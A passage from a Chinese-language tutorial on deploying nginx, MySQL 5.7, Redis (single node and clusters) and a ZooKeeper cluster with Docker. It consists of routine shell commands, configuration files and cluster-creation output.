.htaccess files, if Apache&#x27;s document root</span><br><span class="line">    # concurs with nginx&#x27;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>运行容器</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -it -p 8080:80 --restart=always -v /opt/docker/nginx/conf.d:/etc/nginx/conf.d -v /opt/docker/nginx/logs:/var/log/nginx --name=nginx nginx</span><br></pre></td></tr></table></figure>

<h2 id="8-3-安装mysql"><a href="#8-3-安装mysql" class="headerlink" title="8.3 安装mysql"></a>8.3 安装mysql</h2><ol>
<li>从docker hub上拉取mysql:5.7</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建默认的mysql配置文件my.cnf</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/mysql5.7/conf/my.cnf</span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">socket=/tmp/mysql.sock          #windows下不需要此项配置</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">指定通信socket文件位置，windows下不需要此项配置</span></span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">忽略客户端字符集设置信息，使用服务端的字符集</span></span><br><span class="line">skip-character-set-client-handshake=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">服务段字符集</span></span><br><span class="line">character-set-server=utf8mb4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">排序规则</span></span><br><span class="line">collation-server=utf8mb4_unicode_ci</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">默认存储引擎</span></span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sql模式</span></span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0-表名存储为给定的大小和比较是区分大小写的（unix默认）；1-表名存储在磁盘是小写的，但是比较的时候是不区分大小写（windows默认）；2-表名存储为给定的大小写但是比较的时候是小写的（macOS默认）</span></span><br><span class="line">lower_case_table_names=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最大连接数（范围：1-100000，默认151）</span></span><br><span class="line">max_connections=151</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建并运行mysql容器</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -p 3306:3306 -d -v /opt/docker/mysql5.7/conf:/etc/mysql -v /opt/docker/mysql5.7/logs:/var/log/mysql -v /opt/docker/mysql5.7/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name=mysql5.7 mysql:5.7</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>开放服务器端口</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=3306/tcp --permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>数据库全局备份（非必须）</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec &lt;数据库服务器容器id或名称&gt; sh -c &#x27;exec mysqldump --all-databases -uroot -p&quot;123456&quot;&#x27; &gt; ~/all-databases-backup.sql</span><br></pre></td></tr></table></figure>

<h2 id="8-4-安装redis"><a href="#8-4-安装redis" class="headerlink" title="8.4 安装redis"></a>8.4 安装redis</h2><h3 id="8-4-1-单机"><a href="#8-4-1-单机" class="headerlink" title="8.4.1 单机"></a>8.4.1 单机</h3><ol>
<li>从docker hub上拉取redis</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0.12</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建并运行redis容器</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -p 6379:6379 -d -v /opt/docker/redis5.0.12/conf:/etc/redis/conf -v /opt/docker/redis5.0.12/data:/data --name=redis5.0.12 redis:5.0.12 redis-server /etc/redis/conf --appendonly yes</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>通过客户端连接上redis服务器</li>
</ol>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;redis服务器容器id或名称&gt; redis-cli</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>在宿主机的 &#x2F;opt&#x2F;docker&#x2F;redis5.0.12&#x2F;conf&#x2F;redis.conf 中保存redis配置。</li>
</ol>
<h3 id="8-4-2-集群（三主三从）"><a href="#8-4-2-集群（三主三从）" class="headerlink" title="8.4.2 集群（三主三从）"></a>8.4.2 集群（三主三从）</h3><h4 id="1）自定义虚拟网络redis集群"><a href="#1）自定义虚拟网络redis集群" class="headerlink" title="1）自定义虚拟网络redis集群"></a>1）自定义虚拟网络redis集群</h4><ul>
<li>集群说明：这里使用的子网为172.20.0.0&#x2F;16，仅适合在客户端与服务端在同一台服务器的情况，外网不能直接访问</li>
</ul>
<ol>
<li>创建集群的网络</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker network create --driver bridge --gateway 172.20.0.1 --subnet 172.20.0.0/16 redis-cluster</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>生成6个节点的配置</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for num in $(seq 1 6); \</span><br><span class="line">do \</span><br><span class="line">mkdir -p /opt/docker/redis/node-$&#123;num&#125;/conf</span><br><span class="line">touch /opt/docker/redis/node-$&#123;num&#125;/conf/redis-cluster.conf</span><br><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/redis/node-$&#123;num&#125;/conf/redis-cluster.conf</span><br><span class="line">port 6379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span class="line">cluster-announce-ip 172.20.0.1$&#123;num&#125;</span><br><span class="line">cluster-announce-port 6379</span><br><span class="line">cluster-announce-bus-port 16379</span><br><span class="line">appendonly yes</span><br><span class="line">masterauth passwd</span><br><span class="line">requirepass passwd</span><br><span class="line">EOF</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>启动6个节点的redis</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for num in $(seq 1 6); \</span><br><span class="line">do \</span><br><span class="line">docker run -p 637$&#123;num&#125;:6379 -p 1637$&#123;num&#125;:16379 --name redis-$&#123;num&#125; \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;num&#125;/data:/data \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;num&#125;/conf/redis-cluster.conf:/etc/redis/redis-cluster.conf \</span><br><span class="line">-d --net redis-cluster --ip 172.20.0.1$&#123;num&#125; redis:latest redis-server /etc/redis/redis-cluster.conf</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>登录到任意一个节点</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it redis-1 /bin/bash</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>创建集群</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli --cluster create 172.20.0.11:6379 172.20.0.12:6379 172.20.0.13:6379 172.20.0.14:6379 172.20.0.15:6379 172.20.0.16:6379 --cluster-replicas 1 -a passwd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示如下结果则创建成功</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Performing <span class="built_in">hash</span> slots allocation on 6 nodes...</span></span><br><span class="line">Master[0] -&gt; Slots 0 - 5460</span><br><span class="line">Master[1] -&gt; Slots 5461 - 10922</span><br><span class="line">Master[2] -&gt; Slots 10923 - 16383</span><br><span class="line">Adding replica 172.20.0.15:6379 to 172.20.0.11:6379</span><br><span class="line">Adding replica 172.20.0.16:6379 to 172.20.0.12:6379</span><br><span class="line">Adding replica 172.20.0.14:6379 to 172.20.0.13:6379</span><br><span class="line">M: a747f2e9db2cf7a6dd7f1c1b3435afb50cd56afc 172.20.0.11:6379</span><br><span class="line">   slots:[0-5460] (5461 slots) master</span><br><span class="line">M: a654e99f8d50e02bec40a4c4bff1999174ea1bab 172.20.0.12:6379</span><br><span class="line">   slots:[5461-10922] (5462 slots) master</span><br><span class="line">M: f1c3f6806c24edafe92a9ee365dc7763dee59fc3 172.20.0.13:6379</span><br><span class="line">   slots:[10923-16383] (5461 slots) master</span><br><span class="line">S: 911fa7727f6fa76f1918c47ddd0a78fc9c7ae981 172.20.0.14:6379</span><br><span class="line">   replicates f1c3f6806c24edafe92a9ee365dc7763dee59fc3</span><br><span class="line">S: bdd7305a7d32e5f829c734da6a89b4a71d526ac4 172.20.0.15:6379</span><br><span class="line">   replicates a747f2e9db2cf7a6dd7f1c1b3435afb50cd56afc</span><br><span class="line">S: 94a5ab000fb64cfdb99049d55ccc6be42f13cda3 172.20.0.16:6379</span><br><span class="line">   replicates a654e99f8d50e02bec40a4c4bff1999174ea1bab</span><br><span class="line">Can I set the above configuration? (type &#x27;yes&#x27; to accept): yes</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Nodes configuration updated</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Assign a different config epoch to each node</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Sending CLUSTER MEET messages to <span class="built_in">join</span> the cluster</span></span><br><span class="line">Waiting for the cluster to join</span><br><span class="line">.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Performing Cluster Check (using node 172.20.0.11:6379)</span></span><br><span class="line">M: a747f2e9db2cf7a6dd7f1c1b3435afb50cd56afc 172.20.0.11:6379</span><br><span class="line">   slots:[0-5460] (5461 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">M: a654e99f8d50e02bec40a4c4bff1999174ea1bab 172.20.0.12:6379</span><br><span class="line">   slots:[5461-10922] (5462 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">M: f1c3f6806c24edafe92a9ee365dc7763dee59fc3 172.20.0.13:6379</span><br><span class="line">   slots:[10923-16383] (5461 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">S: 94a5ab000fb64cfdb99049d55ccc6be42f13cda3 172.20.0.16:6379</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates a654e99f8d50e02bec40a4c4bff1999174ea1bab</span><br><span class="line">S: bdd7305a7d32e5f829c734da6a89b4a71d526ac4 172.20.0.15:6379</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates a747f2e9db2cf7a6dd7f1c1b3435afb50cd56afc</span><br><span class="line">S: 911fa7727f6fa76f1918c47ddd0a78fc9c7ae981 172.20.0.14:6379</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates f1c3f6806c24edafe92a9ee365dc7763dee59fc3</span><br><span class="line">[OK] All nodes agree about slots configuration.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Check <span class="keyword">for</span> open slots...</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Check slots coverage...</span></span><br><span class="line">[OK] All 16384 slots covered.</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>登录到redis集群</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -c -p 6379 -a passwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再进行高可用测试：设置一个key，观察key被存放到哪个槽，然后把该槽的主节点停掉，看看能否在获取到该key值</span></span><br></pre></td></tr></table></figure>

<h4 id="2）单机集群"><a href="#2）单机集群" class="headerlink" title="2）单机集群"></a>2）单机集群</h4><ul>
<li>集群说明：在同一台服务器上搭建redis集群，docker网络模式为host</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为按照6.3.1~6.3.6的步骤搭建，只能在集群的机器上访问，仅适合在客户端与服务端在同一台服务器的情况，因为redis集群的网络为172.20.0.0/16，外网无法访问，因此采取host模式</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成6个节点的配置</span></span><br><span class="line">for port in $(seq 6371 6376); \</span><br><span class="line">do \</span><br><span class="line">mkdir -p /opt/docker/redis/node-$&#123;port&#125;/conf</span><br><span class="line">touch /opt/docker/redis/node-$&#123;port&#125;/conf/redis-cluster.conf</span><br><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/redis/node-$&#123;port&#125;/conf/redis-cluster.conf</span><br><span class="line">port $&#123;port&#125;</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span class="line">cluster-announce-ip 192.168.199.140</span><br><span class="line">cluster-announce-port $&#123;port&#125;</span><br><span class="line">cluster-announce-bus-port 1$&#123;port&#125;</span><br><span class="line">appendonly yes</span><br><span class="line">masterauth passwd</span><br><span class="line">requirepass passwd</span><br><span class="line">EOF</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动6个节点的redis</span></span><br><span class="line">for port in $(seq 6371 6376); \</span><br><span class="line">do \</span><br><span class="line">docker run --name redis-$&#123;port&#125; \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;port&#125;/data:/data \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;port&#125;/conf/redis-cluster.conf:/etc/redis/redis-cluster.conf \</span><br><span class="line">-d --net=host --restart=always redis:latest redis-server /etc/redis/redis-cluster.conf</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录到任意一个节点</span></span><br><span class="line">docker exec -it redis-6371 /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建集群</span></span><br><span class="line">redis-cli --cluster create 192.168.199.140:6371 192.168.199.140:6372 192.168.199.140:6373 192.168.199.140:6374 192.168.199.140:6375 192.168.199.140:6376 --cluster-replicas 1 -a passwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地连接测试</span></span><br><span class="line">redis-cli -c -a passwd -p 6371</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">远程连接测试</span></span><br><span class="line">redis-cli -c -a passwd -p 6374 -h 192.168.199.140</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群删除容器以及数据（慎重：只能在测试阶段执行）</span></span><br><span class="line">docker rm -f redis-6371 redis-6372 redis-6373 redis-6374 redis-6375 redis-6376 &amp;&amp; rm -rf /opt/docker/redis</span><br></pre></td></tr></table></figure>

<h4 id="3）多机集群（重点）"><a href="#3）多机集群（重点）" class="headerlink" title="3）多机集群（重点）"></a>3）多机集群（重点）</h4><ul>
<li>集群说明：在六台不同台服务器上搭建redis集群，docker网络模式为host，redis端口为6379，集群总线端口为16379，以下步骤均只需要在同一台机器执行</li>
</ul>
<ol>
<li>自动生成包含所有节点ip信息的cluster-ips文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /opt/docker/redis &amp;&amp; cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/redis/cluster-ips</span><br><span class="line">192.168.199.161</span><br><span class="line">192.168.199.162</span><br><span class="line">192.168.199.163</span><br><span class="line">192.168.199.164</span><br><span class="line">192.168.199.165</span><br><span class="line">192.168.199.166</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在任意一台机器上生成公私钥对</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -f /root/.ssh/id_rsa -N &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>集群配置免密登录，需要输入对应机器的密码</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh-copy-id $ip</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>集群安装rsync</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot;yum -y install rsync&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>在该机器上将免密登录配置以及集群机器ip同步到其它服务器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">rsync -av .ssh/ $ip:/root/.ssh</span><br><span class="line">rsync -av /opt/docker/redis/cluster-ips $ip:/opt/docker/redis/cluster-ips</span><br><span class="line">echo &quot;rsync $ip success.&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>集群启动端口、生成redis配置文件、运行redis容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot; \</span><br><span class="line">firewall-cmd --zone=public --add-port=6379/tcp --add-port=16379/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">mkdir -p /opt/docker/redis/node-$&#123;ip&#125;/conf</span><br><span class="line">touch /opt/docker/redis/node-$&#123;ip&#125;/conf/redis-cluster.conf</span><br><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/redis/node-$&#123;ip&#125;/conf/redis-cluster.conf</span><br><span class="line">port 6379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes.$&#123;ip&#125;.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span class="line">cluster-announce-ip $&#123;ip&#125;</span><br><span class="line">cluster-announce-port 6379</span><br><span class="line">cluster-announce-bus-port 16379</span><br><span class="line">appendonly yes</span><br><span class="line">masterauth passwd</span><br><span class="line">requirepass passwd</span><br><span class="line">EOF</span><br><span class="line">docker run --name redis-$&#123;ip&#125; \</span><br><span class="line">-v /opt/docker/redis/cluster-ips:/cluster-ips:ro \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;ip&#125;/data:/data \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;ip&#125;/conf/redis-cluster.conf:/etc/redis/redis-cluster.conf \</span><br><span class="line">-d --net=host --restart=always redis:latest redis-server /etc/redis/redis-cluster.conf</span><br><span class="line">&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">附：</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##############################单独生成容器并启动###############################</span></span></span><br><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot; \</span><br><span class="line">docker run --name redis-$&#123;ip&#125; \</span><br><span class="line">-v /opt/docker/redis/cluster-ips:/cluster-ips:ro \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;ip&#125;/data:/data \</span><br><span class="line">-v /opt/docker/redis/node-$&#123;ip&#125;/conf/redis-cluster.conf:/etc/redis/redis-cluster.conf \</span><br><span class="line">-d --net=host --restart=always redis:latest redis-server /etc/redis/redis-cluster.conf</span><br><span class="line">&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>创建集群</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录到任意一个节点</span></span><br><span class="line">docker exec -it redis-192.168.199.161 /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建集群</span></span><br><span class="line">redis-cli --cluster create `cat /cluster-ips|awk -F &#x27; &#x27; &#x27;&#123;printf $1&quot;:6379 &quot;&#125;&#x27;` --cluster-replicas 1 -a passwd</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>测试</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地连接测试</span></span><br><span class="line">redis-cli -c -a passwd -p 6379</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">远程连接测试</span></span><br><span class="line">redis-cli -c -a passwd -p 6379 -h 192.168.199.166</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>集群命令</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群启动/停止/重启docker服务，可选值：start/stop/restart</span></span><br><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot; \</span><br><span class="line">systemctl restart docker</span><br><span class="line">&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群启动/停止/重启docker中的redis服务，可选值：start/stop/restart</span></span><br><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot; \</span><br><span class="line">docker restart redis-$&#123;ip&#125;</span><br><span class="line">&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群查看docker中的redis服务状态</span></span><br><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot; \</span><br><span class="line">docker ps | grep redis-$&#123;ip&#125;</span><br><span class="line">&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群删除redis所有文件以及容器（慎重：只能在测试阶段执行）</span></span><br><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">ssh $ip &quot; \</span><br><span class="line">rm -rf /opt/docker/redis/node-$&#123;ip&#125;</span><br><span class="line">docker rm -f redis-$&#123;ip&#125;</span><br><span class="line">&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>10.群起脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt;/opt/docker/redis/redis-cluster.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">保存redis所有节点ip的文件</span></span><br><span class="line">clusterIpsPath=/opt/docker/redis/cluster-ips</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">        start)</span><br><span class="line">                for ip in `cat $clusterIpsPath`; do \</span><br><span class="line">                ssh $ip &quot; \</span><br><span class="line">                docker start redis-$&#123;ip&#125;</span><br><span class="line">                &quot;</span><br><span class="line">                done</span><br><span class="line">                ;;</span><br><span class="line">        stop)</span><br><span class="line">                for ip in `cat $clusterIpsPath`; do \</span><br><span class="line">                ssh $ip &quot; \</span><br><span class="line">                docker stop redis-$&#123;ip&#125;</span><br><span class="line">                &quot;</span><br><span class="line">                done</span><br><span class="line">                ;;</span><br><span class="line">        restart)</span><br><span class="line">                for ip in `cat $clusterIpsPath`; do \</span><br><span class="line">                ssh $ip &quot; \</span><br><span class="line">                docker restart redis-$&#123;ip&#125;</span><br><span class="line">                &quot;</span><br><span class="line">                done</span><br><span class="line">                ;;</span><br><span class="line">        status)</span><br><span class="line">                for ip in `cat $clusterIpsPath`; do \</span><br><span class="line">                ssh $ip &quot; \</span><br><span class="line">                docker ps -a | grep redis-$&#123;ip&#125;</span><br><span class="line">                &quot;</span><br><span class="line">                done</span><br><span class="line">                ;;</span><br><span class="line">        restartDocker)</span><br><span class="line">                for ip in `cat $clusterIpsPath`; do \</span><br><span class="line">                ssh $ip &quot; \</span><br><span class="line">                systemctl restart docker</span><br><span class="line">                &quot;</span><br><span class="line">                done</span><br><span class="line">                ;;</span><br><span class="line">        *)</span><br><span class="line">                echo &quot;Usage: sh redis-cluster.sh start|stop|restart|status|restartDocker&quot;</span><br><span class="line">                ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<p>11.把群起脚本同步到所有节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ip in `cat /opt/docker/redis/cluster-ips`; do \</span><br><span class="line">rsync -av /opt/docker/redis/redis-cluster.sh $ip:/opt/docker/redis/redis-cluster.sh</span><br><span class="line">echo &quot;rsync redis-cluster.sh to $ip success.&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="8-5-搭建zookeeper集群"><a href="#8-5-搭建zookeeper集群" class="headerlink" title="8.5 搭建zookeeper集群"></a>8.5 搭建zookeeper集群</h2><ol>
<li>拉取指定版本zookeeper</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull zookeeper:3.4.14</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建集群网络</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker network create --driver bridge --gateway 172.30.0.1 --subnet 172.30.0.0/16 zk-cluster</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建并启动容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 2181:2181 --name zk1 --net zk-cluster --ip 172.30.0.11 -v /opt/docker/zk1/conf:/conf -v /opt/docker/zk1/data:/data zookeeper:3.4.14</span><br><span class="line">docker run -itd -p 2182:2181 --name zk2 --net zk-cluster --ip 172.30.0.12 -v /opt/docker/zk2/conf:/conf -v /opt/docker/zk2/data:/data zookeeper:3.4.14</span><br><span class="line">docker run -itd -p 2183:2181 --name zk3 --net zk-cluster --ip 172.30.0.13 -v /opt/docker/zk3/conf:/conf -v /opt/docker/zk3/data:/data zookeeper:3.4.14</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>修改zoo.cfg，分别修改&#x2F;opt&#x2F;docker&#x2F;zk1&#x2F;conf&#x2F;zoo.cfg、&#x2F;opt&#x2F;docker&#x2F;zk2&#x2F;conf&#x2F;zoo.cfg、&#x2F;opt&#x2F;docker&#x2F;zk2&#x2F;conf&#x2F;zoo.cfg，增加如下配置：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dataDir=/data</span><br><span class="line">server.1=172.30.0.11:2888:3888</span><br><span class="line">server.2=172.30.0.12:2888:3888</span><br><span class="line">server.3=172.30.0.13:2888:3888</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><p>修改myid，分别修改&#x2F;opt&#x2F;docker&#x2F;zk1&#x2F;data&#x2F;myid、&#x2F;opt&#x2F;docker&#x2F;zk2&#x2F;data&#x2F;myid、&#x2F;opt&#x2F;docker&#x2F;zk3&#x2F;data&#x2F;myid下内容为1、2、3</p>
</li>
<li><p>开启端口</p>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=2181/tcp --add-port=2182/tcp --add-port=2183/tcp -permanent &amp;&amp; firewall-cmd --reload &amp;&amp; firewall-cmd --list-ports</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>重启三个容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker restart zk1</span><br><span class="line">docker restart zk2</span><br><span class="line">docker restart zk3</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>查看容器状态</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -it zk1 ./bin/zkServer.sh status &amp;&amp; docker exec -it zk2 ./bin/zkServer.sh status &amp;&amp; docker exec -it zk3 ./bin/zkServer.sh status</span><br></pre></td></tr></table></figure>

